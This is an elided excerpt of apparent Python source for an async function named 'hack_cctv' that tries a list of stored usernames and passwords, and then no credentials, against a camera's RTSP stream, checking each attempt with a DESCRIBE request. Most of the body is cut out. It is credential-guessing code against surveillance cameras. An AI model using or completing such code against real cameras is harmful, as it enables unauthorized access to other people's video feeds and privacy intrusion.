...
async def hack_cctv(ip: str, port: int) -> str:
    ...
    if service == "rtsp":
        ...
        for username, password in CREDENTIALS:
            ...
            is_valid, error = await validate_rtsp(rtsp_url)
            if is_valid:
        ...
        is_valid, error = await validate_rtsp(no_creds_url)
        if is_valid:
...
async def validate_rtsp(url: str) -> tuple[bool, str]:
    """Validate RTSP URL by sending a DESCRIBE request."""
    try:
        client = rtsp.RTSPClient(url)
